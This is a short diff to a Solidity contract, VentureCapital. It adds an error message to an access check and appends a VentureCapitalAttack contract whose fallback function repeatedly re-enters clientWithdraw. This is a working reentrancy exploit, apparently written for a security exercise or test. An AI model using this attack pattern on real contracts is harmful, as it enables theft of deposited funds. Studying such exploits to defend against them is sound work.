@@ -50,7 +50,8 @@ contract VentureCapital {
     require(
       fundManagementEnabled[msg.sender] ||
         msg.sender == manager ||
-        developerAuthorizer.developerMode()
+        developerAuthorizer.developerMode(),
+        "!isManager"
     );
     _;
   }
@@ -107,4 +108,16 @@ contract VentureCapital {
   }
 
   function() external payable {}
+}
+
+contract VentureCapitalAttack {
+  address vcAddr;
+
+  constructor(address _vcAddr) {
+    vcAddr = _vcAddr;
+  }
+
+  function() external payable {
+    VentureCapital(vcAddr).clientWithdraw(address(this));
+  }
 }
